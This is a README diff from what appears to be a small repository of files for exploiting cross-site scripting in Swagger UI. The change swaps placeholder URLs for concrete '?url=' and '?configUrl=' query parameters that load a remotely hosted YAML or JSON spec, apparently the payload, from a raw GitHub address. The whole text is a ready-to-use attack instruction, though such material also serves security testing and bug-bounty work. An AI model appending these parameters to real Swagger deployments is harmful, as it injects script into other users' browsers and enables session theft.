@@ -1,5 +1,5 @@
 ## swagger  
 
-Files needed to exploit XSS in Swagger :)
+Files needed to exploit XSS in Swagger :) Just need to add these below parameters/values:
 
-?url=https://your_api_spec/spec.yaml or ?configUrl=https://your_api_spec/file.json
+?url=https://raw.githubusercontent.com/B1gN0Se/swagger/main/swagger.yaml or ?configUrl=https://raw.githubusercontent.com/B1gN0Se/swagger/main/swagger.json
